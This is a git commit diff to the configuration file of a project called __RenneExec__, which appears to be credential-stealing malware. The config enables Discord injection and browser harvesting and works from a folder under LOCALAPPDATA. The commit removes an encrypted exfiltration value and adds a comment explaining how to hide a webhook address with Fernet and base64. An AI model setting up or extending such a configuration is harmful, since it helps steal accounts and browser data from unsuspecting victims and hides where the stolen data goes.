0087ad4e52d3ce9580b01559f29960efc81680de
ZYB <dnfking81@gmail.com>
2023-03-07 13:19:06 -0800

    Update cfg.py

--- __RenneExec__/cfg/cfg.py
+++ __RenneExec__/cfg/cfg.py
@@ -5,8 +5,8 @@ LocalAppdata = os.getenv('LOCALAPPDATA')
 __PATH__ = f"{LocalAppdata}\\msi"
 
 class cfg:
-    p219371232="Z0FBQUFBQmtCaWRibktvYnFaR0I5a3FzaTNMeFNMVldkSDVMbFJ1SWV3U0FVUWxsSG1WM0ExVjFZd1Z5WE9JWXVoRk1BS3ZFYjgwUU14dUoyNm5CWldVYUloeWttVXp4dW5WV2hKUXY2ODJLVmtQM3NEbzJubHhEdGRwYW4yNlRjZGVRMjNFbTlWZ2EzaGpSTks0N1BxNVhVU2hfV2tscDVxa2R1bFhQWUgyZGV2bHFpM1NjekVUNEw4eFZKTHdoakw3TldoQm5KcGNOZzVHbzdiS1pVdTViYmNydTUyak1Hc0hxZ1R6S0RaUHU5emh0dkFXdjdLRT0="
-    Runonce = True
+    p219371232="" # Encrypt Webhook with Fernet Key then Encrypt Result in Base64 and place in string.
+    Runonce = True 
     p557216331 = True
     discordInjection = True
     Browsers = True
